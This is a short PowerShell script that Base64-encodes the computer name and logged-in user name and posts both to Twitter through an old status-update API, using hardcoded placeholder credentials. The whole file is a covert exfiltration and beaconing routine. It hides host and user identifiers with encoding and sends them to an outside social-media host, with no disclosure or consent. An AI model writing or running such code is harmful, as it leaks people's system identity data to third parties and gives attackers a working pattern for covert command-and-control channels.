function Send-Tweet($Message)
{
#Twitter Login
$Twitter_UserName = "test"
$Twitter_Password = "test*"
$Twitter_URL = "https://twitter.com/statuses/update.xml?status="

$Twitter_Request = [System.Net.WebRequest]::Create($Twitter_URL + $Message)
$Twitter_Request.credentials= New-Object System.Net.NetworkCredential($Twitter_UserName,$Twitter_Password)
$Twitter_Request.method= "POST"
$Twitter_Request.contentType = "application/x-www-form-urlencoded"
$Twitter_Request.GetResponse().statusCode # return the status code of the request
}


[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$env:COMPUTERNAME"))
$env:COMPUTERNAME
$EUname=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$env:COMPUTERNAME"))
$EHname=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$env:UserName"))




Send-Tweet $EUname
Send-Tweet $EHname